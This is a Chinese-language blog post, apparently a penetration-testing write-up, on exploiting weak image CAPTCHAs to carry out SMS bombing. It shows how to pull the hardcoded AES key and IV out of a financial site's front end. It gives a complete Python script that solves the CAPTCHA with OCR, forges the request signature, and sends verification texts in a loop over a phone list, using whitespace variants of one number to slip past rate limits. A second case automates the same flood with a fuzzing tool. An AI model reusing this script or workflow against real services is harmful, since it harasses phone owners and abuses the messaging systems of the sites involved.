        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>图片验证码是一种常见的安全验证方式，广泛应用于网站、APP等场景，用于区分人类用户和恶意机器人。然而，由于设计或实现上的缺陷，图片验证码可能存在一些问题，导致短信轰炸漏洞的发生。</p><p>常见的图片验证码的问题，一般以下几种：</p><p>1、图片验证码前端生成&amp;前端校验：通俗理解，就是调用前端JS中的函数生成一个验证码，那自然人工输入的验证码校验也是在前端完成的，这种没啥用，形同虚设。</p><p>2、图片验证码不失效：也就是服务端返回验证码之后，只要不再次请求，就一直可以使用，这也是好多年之前的系统常见的验证码漏洞。</p><p>3、验证码可识别：这玩意就比较鸡肋了，主要也是借用一些第三方的ocr做识别，比较好用的就是Python的第三方库—ddddocr了。</p><h1 id="二、案例一"><a href="#二、案例一" class="headerlink" title="二、案例一"></a>二、案例一</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>某金融站点首页，通过短信验证码登录，在点击发送短信的时候，会弹出图片验证码：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012225238.png" alt="img">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012244906.png" alt="image-20240601224405877"> </p><p>成功输入图片验证码后，会向手机号发送短信验证码，具体数据包如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012225780.png" alt="image.png"> </p><h2 id="参数分析"><a href="#参数分析" class="headerlink" title="参数分析"></a>参数分析</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226267.png" alt="image.png"> </p><p>对比上图，共有5个参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mobile_tel：13888888888</span><br><span class="line">image_code：5321</span><br><span class="line">signature_data：M3IC7p1kH5bMMebPjl9H66rsZ+nf3rtYwMk8pUB9fPY=</span><br><span class="line">serial_no：738454630727417856</span><br><span class="line">org_code: ZYGJ001</span><br></pre></td></tr></table></figure><p>其中 signature_data 的值可以看到是经过加密后的，下面先说一下signature_data参数的逆向分析。</p><h3 id="signature-data"><a href="#signature-data" class="headerlink" title="signature_data"></a>signature_data</h3><p>全局关键字搜索，定位到signature_data位置</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226786.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signature_data ：t</span><br><span class="line"></span><br><span class="line">t = Object(h[&quot;a&quot;])(&quot;2&quot;.concat(this.mobile, &quot;random&quot;))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012226542.png" alt="image.png"> </p><p>其中 “Object(h[“a”])” 是函数名，”2”.concat(this.mobile, “random”)是参数值</p><p>假设手机号为：13888888888，则参数值为 213888888888random</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227812.png" alt="image.png"> </p><p>很明显的AES特征，初步判断这块的验签使用的是AES加密。</p><p>下面就是调试出key 和 iv 的值：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">t</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> e = l.<span class="property">a</span>.<span class="title function_">parse</span>(<span class="variable language_">window</span>.<span class="property">LOCAL_CONFIG</span>.<span class="property">AES_KEY</span>)</span><br><span class="line">    , n = l.<span class="property">a</span>.<span class="title function_">parse</span>(<span class="variable language_">window</span>.<span class="property">LOCAL_CONFIG</span>.<span class="property">AES_IV</span>)</span><br><span class="line">    , i = l.<span class="property">a</span>.<span class="title function_">parse</span>(t)</span><br><span class="line">    , a = s.<span class="property">a</span>.<span class="title function_">encrypt</span>(i, e, &#123;</span><br><span class="line">      <span class="attr">iv</span>: n,</span><br><span class="line">      <span class="attr">mode</span>: d.<span class="property">a</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">      <span class="attr">padding</span>: g.<span class="property">a</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> r.<span class="property">a</span>.<span class="title function_">stringify</span>(a.<span class="property">ciphertext</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227283.png" alt="image.png"> </p><p>key：qwertyuiopasdfgh、</p><p>iv：qwertyuiopasdfgh</p><p>使用在线工具验证，结果和上面的一样，参数分析结束</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227137.png" alt="img"> </p><p>Python脚本计算signature_data：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    key = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.encodebytes(AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(pad(data, <span class="number">16</span>, style=<span class="string">&#x27;pkcs7&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genSign</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;2&#x27;</span> + phone + <span class="string">&#x27;random&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h3 id="serial-no"><a href="#serial-no" class="headerlink" title="serial_no"></a>serial_no</h3><p>serial_no：738454630727417856</p><p>一串数字，感觉应该和加解密没啥关系。</p><p>推测应该是图片验证码编号。一些金融机构都比较卷，服务端每次生成图片验证码，会同时生成一个编号，该编号会随着下一次请求和图片验证码一块发送到服务端，如果两者相对应，则校验通过；如果不对应，则失败！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012227216.png" alt="img"> </p><p>一看数据包，果然如此。</p><h3 id="org-code"><a href="#org-code" class="headerlink" title="org_code"></a>org_code</h3><p>分析后，发现该参数在前端配置文件中写死了，没啥分析的必要</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012228958.png" alt="img"> </p><p>到这里，5个参数其实都已经确定了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mobile_tel：手机号</span><br><span class="line">image_code：图片验证码</span><br><span class="line">signature_data：AES加密后的sign</span><br><span class="line">serial_no：图片验证码编号</span><br><span class="line">org_code: 业务参数，固定为ZYGJ001</span><br></pre></td></tr></table></figure><h2 id="Python脚本实现自动化"><a href="#Python脚本实现自动化" class="headerlink" title="Python脚本实现自动化"></a>Python脚本实现自动化</h2><p>获得各个参数</p><ul><li>手机号：手动输入</li><li>图片验证码：URL获取，使用正则提取处图片的Base64，再使用dddocr来识别</li><li>signature_data：AES加密</li><li>serial_no：URL获取，使用正则提取出serial_no</li><li>org_code: 固定为ZYGJ001</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-05-11 14:43</span></span><br><span class="line"><span class="comment"># @Author: muhe</span></span><br><span class="line"><span class="comment"># @File: SMS_bur.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ddddocr <span class="keyword">import</span> DdddOcr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    key = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;qwertyuiopasdfgh&#x27;</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = base64.encodebytes(AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(pad(data, <span class="number">16</span>, style=<span class="string">&#x27;pkcs7&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genSign</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;2&#x27;</span> + phone + <span class="string">&#x27;random&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getCode</span>():</span><br><span class="line">    url = <span class="string">&#x27;图片验证码接口&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;image_width&#x27;</span>: <span class="number">88</span>,</span><br><span class="line">        <span class="string">&#x27;image_height&#x27;</span>: <span class="number">34</span>,</span><br><span class="line">        <span class="string">&#x27;image_code_length&#x27;</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="string">&#x27;org_code&#x27;</span>: <span class="string">&#x27;ZYGJ001&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    <span class="comment"># 正则提取返回包中的serial_no参数</span></span><br><span class="line">    pattern = <span class="string">r&#x27;&quot;serial_no&quot;:&quot;(\d+)&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    serial_no = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 正则提取处返回包中的base64图片</span></span><br><span class="line">    pattern = <span class="string">r&#x27;&quot;image_data&quot;:&quot;data:image/png;base64,([^&quot;]+)&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, response.text)</span><br><span class="line">    captcha_code = <span class="keyword">match</span>.group(<span class="number">1</span>).strip(<span class="string">&#x27;&quot;&#x27;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># print(captcha_code)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># with open(&#x27;captcha.png&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     f.write(base64.b64decode(captcha_code))</span></span><br><span class="line">    <span class="comment"># # 调用ddddocr识别</span></span><br><span class="line">    <span class="comment"># ocr = DdddOcr()</span></span><br><span class="line">    <span class="comment"># with open(&#x27;captcha.png&#x27;, &#x27;rb&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     img = f.read()</span></span><br><span class="line">    <span class="comment"># code = ocr.classification(img)</span></span><br><span class="line">    <span class="comment"># return code</span></span><br><span class="line">    ocr = DdddOcr()</span><br><span class="line">    code = ocr.classification(base64.b64decode(captcha_code))</span><br><span class="line">    <span class="keyword">return</span> code, serial_no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendsms</span>(<span class="params">phone</span>):</span><br><span class="line">    url = <span class="string">&#x27;发送短信接口&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;busin_type&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;mobile_tel&#x27;</span>: phone,</span><br><span class="line">        <span class="string">&#x27;image_code&#x27;</span>: code,</span><br><span class="line">        <span class="string">&#x27;signature_data&#x27;</span>: genSign(phone),</span><br><span class="line">        <span class="string">&#x27;random_str&#x27;</span>: <span class="string">&#x27;random&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;serial_no&#x27;</span>: no,</span><br><span class="line">        <span class="string">&#x27;org_code&#x27;</span>: <span class="string">&#x27;ZYGJ001&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># phone = input(&quot;请输入需要发送验证码的手机号:&quot;)</span></span><br><span class="line">    phones = [<span class="string">&quot;13888888888&quot;</span>,<span class="string">&quot;13888888888 &quot;</span>,<span class="string">&quot;13888888888\t&quot;</span>]</span><br><span class="line">    <span class="comment"># signature = genSign()</span></span><br><span class="line">    <span class="comment"># print(signature)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phones)):</span><br><span class="line">        code, no = getCode()  <span class="comment"># (&#x27;1524&#x27;, &#x27;731541934316728320&#x27;)</span></span><br><span class="line">        sendsms(phones[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="三、案例二"><a href="#三、案例二" class="headerlink" title="三、案例二"></a>三、案例二</h1><p>常规来说涉及到加解密的，可以使用Python脚本来模拟执行，比较方便。。。</p><p>但也有一些站点，本身是不涉及加解密的，这样情况下，每次都要写脚本来做比较浪费时间，也不划算。</p><p>有什么简便方法吗？？？答案当然是有的！</p><h2 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229554.png" alt="img"> </p><p>1、首先，刷新验证码，抓个包简单看一下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229520.png" alt="img"> </p><p>和上一个案例类似，都是返回了验证码图片的base64和验证码编号</p><p>2、输入手机号和验证码，抓包查看参数：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229666.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OS: &quot;IOS&quot;</span><br><span class="line">code: &quot;0567&quot;</span><br><span class="line">codeId: &quot;034675&quot;</span><br><span class="line">deviceId: &quot;randomDeviceId&quot;</span><br><span class="line">loginName: &quot;13888888888&quot;</span><br><span class="line">orgNumber: &quot;1168&quot;</span><br><span class="line">version: &quot;1.0.0&quot;</span><br></pre></td></tr></table></figure><p>其中只有 “code”、”codeId”、”loginName”是可变的，剩下参数都是固定的。</p><p>并且 “code”和”codeId” 是验证码获取的接口返回的。</p><h2 id="dddocr-TangGo"><a href="#dddocr-TangGo" class="headerlink" title="dddocr+TangGo"></a>dddocr+TangGo</h2><h3 id="dddocr"><a href="#dddocr" class="headerlink" title="dddocr"></a>dddocr</h3><p>首先，burp抓包，借用capture-killer插件实现验证码识别</p><p>这块同样，编写Python脚本，使用Flash开启web服务，调用dddocr实现识别。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012229780.png" alt="img"> </p><p>识别成功率100%！！！</p><h3 id="TangGo"><a href="#TangGo" class="headerlink" title="TangGo"></a>TangGo</h3><p>但要实现短线轰炸，还需要提取出验证码的ID。。。</p><p>这块推荐一款新工具，<strong>TangGO</strong> 测试工具来进行提取图形验证码的ID以及img内容来爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 工具下载地址</span><br><span class="line">https://tanggo.nosugar.tech/#/</span><br></pre></td></tr></table></figure><p>1、打开TangGo，找到模糊测试工具模块</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230336.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230741.png" alt="image.png"> </p><p>2、打开后，找到【自定义流程】模块，新建短信轰炸数据包发送前的操作流程</p><p><strong>（1）流程一：获取验证码数据包</strong></p><p>将获取到的响应包数据绑定到变量 “<strong>get_yzm</strong>“（这边变量后面会用到）。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407111631368.png" alt="image-20240711163134263">  </p><p>测试，成功获取到了响应数据包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012230382.png" alt="img"> </p><p><strong>（2）流程二：提取流程一中的 image 和 id</strong></p><p>①新建流程之前，先获取到流程一中image和id提取对应的正则表达式。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231971.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231056.png" alt="image.png"> </p><p>右键选中要提取的内容的正则</p><p>如获取id值：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1717237921456-20c5682d-30ef-4008-aafa-869dac3207fe.png" alt="img"> </p><p>简单测试，成功获取到id值：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231065.png" alt="img"> </p><p>这块选择第一个正则表达式： (?&lt;&#x3D;:{“id”:“).*?(?&#x3D;”,“image)</p><p>同理，可以获取到image的值，正则表达式为：(?&lt;&#x3D;,”image”:“).*?(?&#x3D;”})</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id：(?&lt;=\:\&#123;&quot;id&quot;\:&quot;).*?(?=&quot;\,&quot;image)</span><br><span class="line">image：(?&lt;=,&quot;image&quot;\:&quot;).*?(?=&quot;\&#125;)</span><br></pre></td></tr></table></figure><p>② 新建流程，获取image</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231336.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012231734.png" alt="image.png"> </p><p>③新建流程，获取id</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232756.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232025.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232789.png" alt="image.png"> </p><p>（3）流程三：调用dddocr对image进行识别</p><p>1、首先，简单介绍一下dddocr，它是Python的一个第三方库，可以实现对图片内容的识别</p><p>支持好多种方式识别：</p><ul><li>直接对图片文件进行识别</li><li>对传入的图片base64编码识别（这块也是在这块要使用的）</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ddddocr <span class="keyword">import</span> DdddOcr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    base64_str = <span class="string">&quot;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&quot;</span></span><br><span class="line">    ocr = DdddOcr()</span><br><span class="line">    code = ocr.classification(base64.b64decode(base64_str))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232942.png" alt="image.png"> </p><p>也可以使用wireshark全局抓包，看到其实dddocr处理的就是图片的base64编码部分：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233622.png" alt="image.png"> </p><p>2、这块新建流程，使用flask调用dddocr，实现验证码图片识别</p><p>对api请求获取识别后的验证码，丢入API请求后，在请求头中插入提取的image内容绑定的变量</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233689.png" alt="img"> </p><p>绑定变量的时候要注意，需要选择【提取匹配正则表达式的数据】，然后将识别后的验证码通过正则提取出来</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233767.png" alt="img"> </p><p>【注】这块要注意千万不要选择“提取完整响应数据”，这块的响应数据是响应包，不是响应体</p><h3 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h3><p>获取到图形验证码响应体-&gt;提取ID &amp;&amp; 提取image-&gt;api接口识别验证码</p><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><p>使用http抓包工具，抓取到发送验证码的数据包。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233790.png" alt="image.png"> </p><p>将其发送到http模糊测试工具，在验证码请求的位置插入对应变量</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233849.png" alt="img"> </p><p>设置爆破模式为【无值重放】模式：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234744.png" alt="image.png"> </p><p>然后进入测试过程进行测试配置</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234392.png" alt="image.png"> </p><p>点击【开始】成功爆破</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234061.png" alt="image.png"> </p><p>可以点击查看请求参数，可以看到自定义流程中的数据都在此处有体现：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234847.png" alt="image.png"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012244288.png" alt="image-20240601224441268"> </p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>整个流程中有几个地方需要注意一下，比较容易出问题。</p><h2 id="Bug-验证码识别的流程不能测试"><a href="#Bug-验证码识别的流程不能测试" class="headerlink" title="Bug-验证码识别的流程不能测试"></a>Bug-验证码识别的流程不能测试</h2><p>在前面自定义流程中，最后一个流程，设置变量，使用dddocr识别验证码</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235449.png" alt="image.png"> </p><p>这块的【测试】选项，是没啥用的，加载不上我们设置的变量。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235979.png" alt="img"> </p><p>可以wireshark抓包测试查看。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235007.png" alt="img"> </p><p>刚开始的时候，浪费了半个小时，一直搁那儿测试，找原因。原先以为是 re_image的正则写错了，排了好久，一直没有返回。原来是功能点的bug！</p><h2 id="tip-验证码识别结果正则匹配"><a href="#tip-验证码识别结果正则匹配" class="headerlink" title="tip-验证码识别结果正则匹配"></a>tip-验证码识别结果正则匹配</h2><p>还是同样的位置，需要注意绑定变量的时候，需要选择【提取匹配正则表达式的数据】，然后将识别后的验证码通过正则提取出来</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235544.png" alt="img"> </p><p>这块千万不要选择“提取完整响应数据”，这块的响应数据指的是是响应包，不是响应体</p><p>这样子提取出来的就是整个响应数据包了，肯定不是我们要的东西。</p><h2 id="tip-自定义流程顺序很重要"><a href="#tip-自定义流程顺序很重要" class="headerlink" 